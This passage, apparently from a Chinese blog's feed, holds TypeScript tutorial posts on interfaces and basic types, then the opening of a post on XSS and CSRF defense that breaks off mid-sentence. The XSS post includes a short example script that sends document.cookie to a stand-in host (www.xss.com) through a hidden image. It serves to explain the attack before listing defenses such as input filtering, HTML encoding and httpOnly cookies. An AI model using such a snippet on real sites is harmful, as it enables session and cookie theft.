&#123;</span><br><span class="line">    [index: string]: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj: IndexStr = &#123;<span class="string">'x'</span>: <span class="string">'hello'</span>, <span class="string">'y'</span>: <span class="string">'world'</span>&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj[<span class="string">'x'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 同时指定 索引类型 为 number 和 string</span></span><br><span class="line"></span><br><span class="line">interface TotalIndex &#123;</span><br><span class="line">    [index: number]: number;</span><br><span class="line">    at: number; <span class="comment">// success</span></span><br><span class="line">    where: string; <span class="comment">// error 使用 where 获取值时返回的是 string 类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 只读的索引类型</span></span><br><span class="line"></span><br><span class="line">interface RdIndex &#123;</span><br><span class="line">    readonly [index: number]: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr: RdIndex = [<span class="string">'a'</span>,<span class="string">'b'</span>]</span><br><span class="line"></span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">'c'</span>; <span class="comment">// error, arr 为只读的索引类型</span></span><br></pre></td></tr></table></figure><h4 id="‘类’类型"><a href="#‘类’类型" class="headerlink" title="‘类’类型"></a>‘类’类型</h4><p>和其它的类型约束相似，类类型使用 <code>implements</code> 实现接口。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义方式完全一致</span></span><br><span class="line">interface C &#123;</span><br><span class="line">    date: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clock</span> <span class="title">implements</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 声明一个 date 属性，且约束该属性类型为 Date</span></span><br><span class="line">     <span class="comment">// 这种写法相当于 var date: Date</span></span><br><span class="line">     <span class="comment">// 只是声明并约束值类型，但并不赋值</span></span><br><span class="line">    date: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.date = d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">constructor</span>(h: number, m: number) &#123;</span><br><span class="line">        <span class="comment">// ..</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于更多的 <code>implements</code> 的用法我目前也不是特别的清楚，所以下面就不再详细叙述了。<br>等我了解清楚之后再补上这一部分内容，你也可以通过查看<a href="https://www.tslang.cn/docs/handbook/interfaces.html" target="_blank" rel="noopener">官方文档</a>了解。</p><h4 id="继承接口"><a href="#继承接口" class="headerlink" title="继承接口"></a>继承接口</h4><p>和 <code>es2015</code> 中的 <code>extends</code> 一样，接口也是可以像类一样用来继承的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">interface A &#123;</span><br><span class="line">    a: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface C &#123;</span><br><span class="line">    c: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface B extends A, C &#123;</span><br><span class="line">    b: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &lt;B&gt;&#123;&#125;;</span><br><span class="line">obj.a = 10;</span><br><span class="line">obj.b = '10';</span><br><span class="line">obj.c = 10;</span><br></pre></td></tr></table></figure><h4 id="混合类型"><a href="#混合类型" class="headerlink" title="混合类型"></a>混合类型</h4><p><code>interface</code> 还可以在一个接口中约束 <code>javascript</code> 中多个类型；</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Counter &#123;</span><br><span class="line">    a: <span class="built_in">number</span>; <span class="comment">// 约束 a 为 number 类型</span></span><br><span class="line">    getStr(): <span class="built_in">void</span>;<span class="comment">// 约束 getStr 无返回值；</span></span><br><span class="line">    (n: <span class="built_in">number</span>): <span class="built_in">string</span>;<span class="comment">// 约束匿名函数接受一个参数 n 为 number 类型，返回值 string 类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数 getCounter 返回值被 Counter 约束</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCounter</span>(<span class="params"></span>): <span class="title">Counter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> counter = &lt;Counter&gt;<span class="function"><span class="keyword">function</span> (<span class="params">start: <span class="built_in">number</span></span>) </span>&#123; &#125;; <span class="comment">// 类型断言</span></span><br><span class="line">    counter.interval = <span class="number">123</span>;</span><br><span class="line">    counter.reset = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; &#125;;</span><br><span class="line">    <span class="keyword">return</span> counter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> c = getCounter();</span><br><span class="line">c(<span class="number">10</span>);</span><br><span class="line">c.reset();</span><br><span class="line">c.interval = <span class="number">5.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 这个模版有问题，写 ts 的代码就会出问题</span></span><br><span class="line"><span class="comment">// 只能这样了</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><h4 id="接口继承类"><a href="#接口继承类" class="headerlink" title="接口继承类"></a>接口继承类</h4><p>接口继承类时会继承父类所有的属性和方法，包括 <code>private</code> 和 <code>protected</code> 成员。<br>这意味着当你创建了一个接口继承了一个拥有 <code>私有或受保护的成员</code> 的类时，这个接口类型只能被 <code>这个类或其子类</code> 所实现（implement）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    private state: any;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SelectableControl 含有 Control 所有的属性方法</span></span><br><span class="line">interface SelectableControl extends Control &#123;</span><br><span class="line">    select(): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Button 继承自 Control 含有 Control 所有的属性方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span> <span class="keyword">extends</span> <span class="title">Control</span> <span class="title">implements</span> <span class="title">SelectableControl</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TextBox 继承自 Control 含有 Control 所有的属性方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TextBox</span> <span class="keyword">extends</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Image 没有继承自 Control，没有 state 属性，无法实现 SelectableControl 接口</span></span><br><span class="line"><span class="comment">// 错误：“Image”类型缺少“state”属性。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Image</span> <span class="title">implements</span> <span class="title">SelectableControl</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇介绍 &lt;code&gt;typescript&lt;/code&gt; 中接口的使用方式。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(一)</title>
    <link href="https://github.com/TheNightElf/2018/01/08/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2018/01/08/Typescript学习日记（一）/</id>
    <published>2018-01-08T08:14:30.000Z</published>
    <updated>2018-01-22T04:01:24.180Z</updated>
    
    <content type="html"><![CDATA[<p><code>javascript</code> 是运行在浏览器中的一门脚本语言，为了尽可能的减少内存的开支所以在设计之初它就是一门 <code>弱类型</code> 的语言。这在开发小而简单的应用时是可以为我们带来性能的提升，但是随着项目的扩大 <code>状态</code> 变的难以追踪将会引发很多的 <code>bug</code> 出现。<br>例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> test;</span><br><span class="line"><span class="comment">// -&gt; 'undefined'</span></span><br><span class="line"></span><br><span class="line">test = <span class="string">'str'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> test;</span><br><span class="line"><span class="comment">// -&gt; 'string'</span></span><br><span class="line"></span><br><span class="line">test = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> test;</span><br><span class="line"><span class="comment">// -&gt; 'number'</span></span><br></pre></td></tr></table></figure></p><a id="more"></a><h3 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript"></a>Typescript</h3><p><code>typescript</code> 是 <code>javascript</code> 的强类型版本。它会在编译期去掉类型和特有语法生成 <code>javascript</code> 代码。<code>typescript</code> 是 <code>javascript</code> 的超集，它支持所有 <code>javascript语法</code>，与此同时它又为 <code>javascript</code> 添加了 <code>静态类型检查</code> 使得 <code>javacript</code> 也拥有了 <code>强类型语言</code> 的特性。</p><h3 id="Typescript-基础类型"><a href="#Typescript-基础类型" class="headerlink" title="Typescript 基础类型"></a>Typescript 基础类型</h3><h4 id="布尔值-boolean"><a href="#布尔值-boolean" class="headerlink" title="布尔值(boolean)"></a>布尔值(boolean)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bool: boolean = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">bool = <span class="number">123</span>;</span><br><span class="line"><span class="comment">// 报错，123是number类型而非boolean类型</span></span><br><span class="line"></span><br><span class="line">bool = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// ok，true是一个boolean类型</span></span><br></pre></td></tr></table></figure><h4 id="数值-number"><a href="#数值-number" class="headerlink" title="数值(number)"></a>数值(number)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num: number = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">num = <span class="string">'str'</span>;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">456</span>;</span><br><span class="line"><span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="字符串-string"><a href="#字符串-string" class="headerlink" title="字符串(string)"></a>字符串(string)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: string = <span class="string">'str'</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h4 id="数组-array"><a href="#数组-array" class="headerlink" title="数组(array)"></a>数组(array)</h4><p><strong>定义方式：</strong><br>第一种，可以在 <code>元素类型</code> 后面接上 <code>[]</code>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: number[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></figure></p><p>第二种，使用 <code>数组泛型</code> 定义。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: <span class="built_in">Array</span>&lt;number&gt; = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br></pre></td></tr></table></figure></p><h4 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组(tuple)"></a>元组(tuple)</h4><p>元组类型允许表示一个已知元素数量和类型的数组(其实就是一个数组内包含多个类型的值)。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> tup: [number, string] = [<span class="number">123</span>,<span class="string">'str'</span>];</span><br></pre></td></tr></table></figure></p><h4 id="枚举-enum"><a href="#枚举-enum" class="headerlink" title="枚举(enum)"></a>枚举(enum)</h4><p><code>enum</code> 类型是对JavaScript标准数据类型的一个补充。 像C#等其它语言一样，使用枚举类型可以为一组数值赋予友好的名字。<br><strong>用人话说就是：把一组值放到一个可迭代的对象中，然后给这个对象起了个名字。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">enum animal &#123;dog,cat,pig&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象取值</span></span><br><span class="line"><span class="keyword">let</span> a: animal = animal.dog</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组取值</span></span><br><span class="line"><span class="keyword">let</span> b = animal[<span class="number">0</span>] <span class="comment">// -&gt; dog</span></span><br><span class="line"><span class="keyword">let</span> b = animal[<span class="number">1</span>] <span class="comment">// -&gt; cat</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以手动更改索引</span></span><br><span class="line"><span class="comment">// enum animal &#123;dog = 1, cat, pig&#125;</span></span><br><span class="line"><span class="comment">// let b = animal[1] // -&gt; dog</span></span><br><span class="line"><span class="comment">// let b = animal[2] // -&gt; cat</span></span><br></pre></td></tr></table></figure><h4 id="任何类型-any"><a href="#任何类型-any" class="headerlink" title="任何类型(any)"></a>任何类型(any)</h4><p>若是不清楚变量的具体类型可以指定为 <code>any</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a: any = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">a = <span class="string">'str'</span>; <span class="comment">// success</span></span><br><span class="line">a = <span class="number">123</span>; <span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="无类型-void"><a href="#无类型-void" class="headerlink" title="无类型(void)"></a>无类型(void)</h4><p>与 <code>any</code> 相反。一个函数没有返回值的时候通常指定其返回值类型为 <code>void</code>。<br>一个 <code>void</code> 类型的变量只能赋值为 <code>undefined</code> | <code>null</code>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noReturn</span>(<span class="params"></span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这个函数没有返回值'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> n: <span class="keyword">void</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// let n: void = undefined;</span></span><br></pre></td></tr></table></figure></p><h4 id="null和undefined"><a href="#null和undefined" class="headerlink" title="null和undefined"></a>null和undefined</h4><p><code>undefined</code>和<code>null</code>两者各自有自己的类型还是叫做<code>undefined</code>和<code>null</code>。</p><p><strong>默认情况下null和undefined是所有类型的子类型。 就是说你可以把 null和undefined赋值给number类型的变量。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> u: <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> n: <span class="literal">null</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num: number = <span class="number">123</span>;</span><br><span class="line">num = <span class="literal">undefined</span>; <span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="永远不存在的值-never"><a href="#永远不存在的值-never" class="headerlink" title="永远不存在的值(never)"></a>永远不存在的值(never)</h4><p>例如， never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型；<br><strong>never类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是never的子类型或可以赋值给never类型（除了never本身之外）。 即使 any也不可以赋值给never。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> n: never; <span class="comment">// never 不能被赋值</span></span><br><span class="line"><span class="keyword">let</span> num: number = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">let</span> a: any;</span><br><span class="line"></span><br><span class="line">num = n; <span class="comment">// success，never类型是任何类型的子类型</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">123</span>; <span class="comment">// error</span></span><br><span class="line">n = a; <span class="comment">// error</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回never的函数必须存在无法达到的终点</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params">message: string</span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h4><p>有时候你会遇到这样的情况，你会比TypeScript更了解某个值的详细信息。 通常这会发生在你清楚地知道一个实体具有比它现有类型更确切的类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: any = <span class="string">"this is a string"</span>;</span><br><span class="line"><span class="keyword">let</span> strLength1: number;</span><br><span class="line"><span class="keyword">let</span> strLength2: number;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 as 断言语法</span></span><br><span class="line">strLength1 = (str <span class="keyword">as</span> string).length;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 &lt;&gt; 断言语法</span></span><br><span class="line">strLength2 = (&lt;string&gt;str).length;</span><br><span class="line"></span><br><span class="line">// 上面这两种断言方式得到的效果完全一致，下面增加的内容是因为模版出了点bug</span><br><span class="line">// 对于语法的解析已经不是js的语法了，不填充以下内容，整块js都无法展示</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br></pre></td></tr></table></figure><p>以上是 <code>typescript</code> 所有的基础类型。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;javascript&lt;/code&gt; 是运行在浏览器中的一门脚本语言，为了尽可能的减少内存的开支所以在设计之初它就是一门 &lt;code&gt;弱类型&lt;/code&gt; 的语言。这在开发小而简单的应用时是可以为我们带来性能的提升，但是随着项目的扩大 &lt;code&gt;状态&lt;/code&gt; 变的难以追踪将会引发很多的 &lt;code&gt;bug&lt;/code&gt; 出现。&lt;br&gt;例子：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// -&amp;gt; &#39;undefined&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test = &lt;span class=&quot;string&quot;&gt;&#39;str&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// -&amp;gt; &#39;string&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test = &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// -&amp;gt; &#39;number&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS和CSRF防御</title>
    <link href="https://github.com/TheNightElf/2018/01/05/XSS%E5%92%8CCSRF%E9%98%B2%E5%BE%A1/"/>
    <id>https://github.com/TheNightElf/2018/01/05/XSS和CSRF防御/</id>
    <published>2018-01-05T06:02:51.000Z</published>
    <updated>2018-01-05T06:43:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>XSS和CSRF(XSRF)都属于跨站攻击，XSS是实现CSRF(XSRF)诸多途径中的一条，但不是唯一一条。</p><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XSS的本质是让对方浏览器执行你插入的js ，来获取<code>cookie</code>等信息；<br>CSRF(XSRF)是借用用户的身份，向服务器发送请求。</p><h3 id="XSS的类型"><a href="#XSS的类型" class="headerlink" title="XSS的类型"></a>XSS的类型</h3><h5 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h5><p>储存型的XSS代码是储存在服务器端，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 <code>cookie</code> 等。</p><h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h5><p>反射型XSS需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS。</p><p><strong>Example:</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">'http://www.xss.com?cookie='</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line">img.style.display = <span class="string">'none'</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(img);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这样就能在用户不知道的情况下将用户在该网站的 `cookie` 信息以 `get` 请求的方式发送给另一个地址。</span></span><br></pre></td></tr></table></figure><h3 id="XSS的防范"><a href="#XSS的防范" class="headerlink" title="XSS的防范"></a>XSS的防范</h3><p>客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行。</p><p><strong>Example:</strong></p><ul><li>移除用户上传的DOM属性，如 <code>onerror</code> 等。</li><li>移除用户上传的 <code>style</code>节点，<code>script</code>节点，<code>iframe</code>节点等。</li><li>对用户输入的代码标签进行转换(html encode)。</li><li>对url中的参数进行过滤。</li><li>对动态输出到页面的内容进行HTML编码。</li><li>服务端对敏感的 <code>Cookie</code> 设置 <code>httpOnly</code> 属性，使js脚本不能读取到 <code>cookie</code>。</li></ul><p><strong>题外话：</strong><br>目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的 <code>script</code> 标签，这段脚本很明显就是一段XSS攻击，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。</p><h3 id="CSRF-XSRF-的过程"><a href="#CSRF-XSRF-的过程" class="headerlink" title="CSRF(XSRF)的过程"></a>CSRF(XSRF)的过程</h3><p><strong>Example:</strong></p><ul><li>用户小明在你的网站A上面登录了，A返回了一个 <code>session 